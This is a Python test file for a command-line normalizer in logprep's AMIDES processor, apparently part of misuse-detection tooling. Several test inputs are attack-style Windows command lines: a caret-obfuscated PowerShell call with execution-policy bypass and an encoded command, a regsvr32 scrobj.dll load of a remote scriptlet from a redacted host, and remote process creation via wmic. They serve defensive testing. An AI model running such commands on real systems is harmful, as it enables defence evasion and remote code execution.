# pylint: disable=missing-docstring
# pylint: disable=protected-access
import pytest

from logprep.processor.amides.normalize import CommandLineNormalizer


class TestCommandLineNormalizer:
    cmdline_expected = [
        (
            'wmic -node:"" process  call  create  "rundll32 c:\\windows\\system32\\shell32.dll, Control_RunDLL"',
            "c,call,control_rundll,create,dll,node,process,rundll32,shell32,system32,windows,wmic",
        ),
        (
            "ps -accepteula \\%ws -u %user% -p %pass% -s cmd /c netstat",
            "accepteula,c,cmd,netstat,p,pass,ps,s,u,user,ws",
        ),
        (
            'C:\\Windows\\System32\\xcopy.exe /S/E/C/Q/H \\client\\"Default User"\\  C:\\Users\\"Default User"\\',
            "c,c,c,client,default,default,e,exe,h,q,s,system32,user,user,users,windows,xcopy",
        ),
        (
            "C:\\WINDOWS\\system32\\cmd.exe /c P^^o^^w^^e^^r^^S^^h^^e^^l^^l^^.^^e^^x^^e^^ -No^^Exit -Ex^^ec By^^pass -^^EC YwBhAG^^wAYwAYwBhAG^^wAYwAYwBhAG^^wAYwAYwBhAG^^wAYwAYwBhAG^^wAYwA",
            "bypass,c,c,cmd,ec,exe,exe,exec,noexit,powershell,system32,windows",
        ),
        (
            'regsvr32.exe ^^/s ^/n^^ /u^^ /i:"h"t"t"p://<REDACTED>.jpg scrobj.dll',
            "dll,exe,http,i,jpg,n,redacted,regsvr32,s,scrobj,u",
        ),
        ("C:\\set_spn.exe -q */*server* 0x12345", "c,exe,q,server,set_spn"),
        ("cmd /c assoc .bak=cbdef", "assoc,bak,c,cmd"),
        ("0x12345", ""),
    ]

    @pytest.mark.parametrize("cmdline, expected", cmdline_expected)
    def test_normalize(self, cmdline, expected):
        normalizer = CommandLineNormalizer(max_num_values_length=4, max_str_length=30)
        normalized = normalizer.normalize(cmdline)

        assert normalized == expected
